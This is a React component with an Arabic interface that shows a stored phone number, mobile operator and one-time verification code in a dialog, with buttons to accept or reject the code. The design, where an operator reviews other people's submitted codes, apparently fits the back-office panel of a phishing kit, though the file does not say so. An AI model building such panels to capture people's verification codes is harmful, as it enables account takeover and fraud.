"use client";

import { useState } from "react";
import { toast } from "sonner";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { CheckCircle, XCircle, MessageSquare } from "lucide-react";
import { Notification } from "@/lib/firebase";

interface PhoneDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  notification: Notification | null;
  phoneOtp?: string;
  handlePhoneOtpApproval: (state: string, id: string) => Promise<void>;
}

export default function PhoneDialog({
  open,
  onOpenChange,
  notification,
  phoneOtp,
  handlePhoneOtpApproval,
}: PhoneDialogProps) {
  const [isLoading, setIsLoading] = useState(false);

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle>معلومات الهاتف</DialogTitle>
          <DialogDescription>تفاصيل رقم الهاتف ورمز التحقق</DialogDescription>
        </DialogHeader>

        <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 my-4">
          <div className="flex justify-between items-center">
            <div>
              <p className="text-sm text-muted-foreground">رقم الهاتف</p>
              <p className="text-md font-mono font-medium mt-1">
                {notification?.phone || notification?.phone2 || "غير محدد"}
              </p>
              <p className="text-sm text-muted-foreground">الشبكة</p>
              <p className="text-md font-mono font-medium mt-1">
                {notification?.operator || "غير محدد"}
              </p>

              <p className="text-sm text-muted-foreground mt-3">رمز التحقق</p>
              <p className="text-xl font-mono font-bold mt-1">
                {notification?.phoneOtpCode || "غير محدد"}
              </p>
            </div>
            <MessageSquare className="h-10 w-10 text-primary opacity-70" />
          </div>
        </div>

        <DialogFooter className="flex justify-between">
          <Button
            type="button"
            variant="destructive"
            onClick={() => handlePhoneOtpApproval("rejected", notification!.id)}
            disabled={isLoading}
          >
            <XCircle className="h-4 w-4 mr-2" />
            رفض الرمز
          </Button>
          <Button
            type="button"
            variant="default"
            className="bg-green-600 hover:bg-green-700"
            onClick={() => handlePhoneOtpApproval("approved", notification!.id)}
            disabled={isLoading}
          >
            <CheckCircle className="h-4 w-4 mr-2" />
            قبول الرمز
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
